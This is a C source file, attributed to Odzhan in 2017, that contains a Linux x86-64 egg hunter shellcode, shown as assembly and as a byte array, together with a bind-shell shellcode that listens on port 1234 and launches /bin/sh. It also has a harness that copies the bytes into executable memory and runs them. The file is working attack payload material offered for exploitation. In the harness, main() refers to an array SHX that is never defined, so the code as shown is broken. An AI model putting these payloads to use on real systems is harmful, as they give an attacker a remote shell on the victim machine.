
/**
  Copyright © 2017 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. 
  
; Linux x86-64 egg hunter using sys_access()
;
; 38 bytes
;
    bits    64
      
    xor     edi, edi  ; rdi = 0
    mul     edi       ; rax = 0, rdx = 0
    xchg    eax, esi  ; rsi = F_OK
    mov     dh, 10h   ; rdx = 4096
nxt_page:
    add     rdi, rdx  ; advance 4096 bytes
nxt_addr:
    push    rdi       ; save page address
    add     rdi, 8    ; try read 8 bytes ahead
    push    21
    pop     rax       ; rax = sys_access 
    syscall
    pop     rdi       ; restore rdi
    cmp     al, 0xF2  ; -EFAULT means bad address
    je      nxt_page  ; keep going until good read
    
    ; put your own egg signature here
    mov     eax, 0xDEADC0DE
    scasd
    jne     nxt_addr

    scasd
    jne     nxt_addr
    
    jmp     rdi       ; jump into shellcode
    
  
  */
  
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/mman.h>

#define EGG64_SIZE 38

char EGG64[] = {
  /* 0000 */ "\x31\xff"             /* xor edi, edi        */
  /* 0002 */ "\xf7\xe7"             /* mul edi             */
  /* 0004 */ "\x96"                 /* xchg esi, eax       */
  /* 0005 */ "\xb6\x10"             /* mov dh, 0x10        */
  /* 0007 */ "\x48\x01\xd7"         /* add rdi, rdx        */
  /* 000A */ "\x57"                 /* push rdi            */
  /* 000B */ "\x48\x83\xc7\x08"     /* add rdi, 0x8        */
  /* 000F */ "\x6a\x15"             /* push 0x15           */
  /* 0011 */ "\x58"                 /* pop rax             */
  /* 0012 */ "\x0f\x05"             /* syscall             */
  /* 0014 */ "\x5f"                 /* pop rdi             */
  /* 0015 */ "\x3c\xf2"             /* cmp al, 0xf2        */
  /* 0017 */ "\x74\xee"             /* jz 0x7              */
  /* 0019 */ "\xb8\xde\xc0\xad\xde" /* mov eax, 0xdeadc0de */
  /* 001E */ "\xaf"                 /* scasd               */
  /* 001F */ "\x75\xe9"             /* jnz 0xa             */
  /* 0021 */ "\xaf"                 /* scasd               */
  /* 0022 */ "\x75\xe6"             /* jnz 0xa             */
  /* 0024 */ "\xff\xe7"             /* jmp rdi             */
};

// sig is 0xDEADCODE
#define EGG_SIG "\xDE\xC0\xAD\xDE"

// 64-bit bind shell for 0.0.0.0:1234
char BS[] = {
  EGG_SIG
  EGG_SIG
  /* 0000 */ "\x48\xb8\xfd\xff\xfb\x2d\xff\xff\xff\xff" /* mov rax, 0xffffffff2dfbfffd */
  /* 000A */ "\x48\xf7\xd0"                             /* not rax                     */
  /* 000D */ "\x50"                                     /* push rax                    */
  /* 000E */ "\x54"                                     /* push rsp                    */
  /* 000F */ "\x5d"                                     /* pop rbp                     */
  /* 0010 */ "\x6a\x29"                                 /* push 0x29                   */
  /* 0012 */ "\x58"                                     /* pop rax                     */
  /* 0013 */ "\x99"                                     /* cdq                         */
  /* 0014 */ "\x6a\x01"                                 /* push 0x1                    */
  /* 0016 */ "\x5e"                                     /* pop rsi                     */
  /* 0017 */ "\x6a\x02"                                 /* push 0x2                    */
  /* 0019 */ "\x5f"                                     /* pop rdi                     */
  /* 001A */ "\x0f\x05"                                 /* syscall                     */
  /* 001C */ "\x97"                                     /* xchg edi, eax               */
  /* 001D */ "\x55"                                     /* push rbp                    */
  /* 001E */ "\x5e"                                     /* pop rsi                     */
  /* 001F */ "\xb2\x10"                                 /* mov dl, 0x10                */
  /* 0021 */ "\xb0\x31"                                 /* mov al, 0x31                */
  /* 0023 */ "\x0f\x05"                                 /* syscall                     */
  /* 0025 */ "\x50"                                     /* push rax                    */
  /* 0026 */ "\x5e"                                     /* pop rsi                     */
  /* 0027 */ "\xb0\x32"                                 /* mov al, 0x32                */
  /* 0029 */ "\x0f\x05"                                 /* syscall                     */
  /* 002B */ "\xb0\x2b"                                 /* mov al, 0x2b                */
  /* 002D */ "\x0f\x05"                                 /* syscall                     */
  /* 002F */ "\x97"                                     /* xchg edi, eax               */
  /* 0030 */ "\x96"                                     /* xchg esi, eax               */
  /* 0031 */ "\x6a\x21"                                 /* push 0x21                   */
  /* 0033 */ "\x58"                                     /* pop rax                     */
  /* 0034 */ "\x0f\x05"                                 /* syscall                     */
  /* 0036 */ "\x83\xee\x01"                             /* sub esi, 0x1                */
  /* 0039 */ "\x79\xf6"                                 /* jns 0x31                    */
  /* 003B */ "\x99"                                     /* cdq                         */
  /* 003C */ "\x31\xf6"                                 /* xor esi, esi                */
  /* 003E */ "\x52"                                     /* push rdx                    */
  /* 003F */ "\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68" /* mov rcx, 0x68732f2f6e69622f */
  /* 0049 */ "\x51"                                     /* push rcx                    */
  /* 004A */ "\x54"                                     /* push rsp                    */
  /* 004B */ "\x5f"                                     /* pop rdi                     */
  /* 004C */ "\xb0\x3b"                                 /* mov al, 0x3b                */
  /* 004E */ "\x0f\x05"                                 /* syscall                     */
};

void xcode(char *s, int len)
{
  uint8_t *p;
  
  p=(uint8_t*)mmap (0, len, 
      PROT_EXEC | PROT_WRITE | PROT_READ, 
      MAP_ANON  | MAP_PRIVATE, -1, 0);  

  memcpy(p, s, len);
  
  // execute
  ((void(*)())p)();
    
  munmap ((void*)p, len);  
}

int main(int argc, char *argv[])
{
  uint8_t *sc=(uint8_t*)mmap (0, sizeof(SHX), 
      PROT_EXEC | PROT_WRITE | PROT_READ, 
      MAP_ANON  | MAP_PRIVATE, -1, 0); 
      
  if (sc != NULL) {
    memcpy (sc, SHX, sizeof(SHX));    
    xcode (EGG64, EGG64_SIZE);
    munmap((void*)sc, sizeof(SHX));
  }
  return 0;  
}
